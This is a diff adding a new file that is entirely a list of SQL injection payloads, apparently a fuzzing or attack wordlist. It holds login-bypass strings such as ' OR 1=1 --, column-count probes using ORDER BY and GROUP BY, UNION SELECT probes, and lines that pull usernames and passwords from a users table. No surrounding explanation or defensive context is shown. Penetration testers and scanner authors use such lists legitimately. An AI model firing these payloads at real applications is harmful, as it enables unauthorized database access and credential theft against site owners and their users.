@@ -1,0 +1,37 @@
+\
+'
+"
+' OR 1=1 --
+" OR 1=1 --
+' OR '1'='1
+" OR "1"="1
+' OR 'a'='a
+" OR "a"="a
+' OR 1=1#
+" OR 1=1#
+' OR 'a'='a'#
+" OR "a"="a'#
+admin'--
+admin' #
+admin'/*
+' OR 1=1) --
+" OR 1=1) --
+' OR 1=1) #
+" OR 1=1) #
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 1,2--
+1' ORDER BY 1,2,3--
+1' GROUP BY 1,2,--
+1' GROUP BY 1,2,3--
+' UNION SELECT 1,2,3 --
+" UNION SELECT 1,2,3 --
+' UNION SELECT NULL,NULL,NULL --
+" UNION SELECT NULL,NULL,NULL --
+' AND 1=0 UNION ALL SELECT 1,2,3 --
+" AND 1=0 UNION ALL SELECT 1,2,3 --
+' AND 1=0 UNION ALL SELECT NULL,NULL,NULL --
+" AND 1=0 UNION ALL SELECT NULL,NULL,NULL --
+' UNION SELECT username, password FROM users --
+" UNION SELECT username, password FROM users --
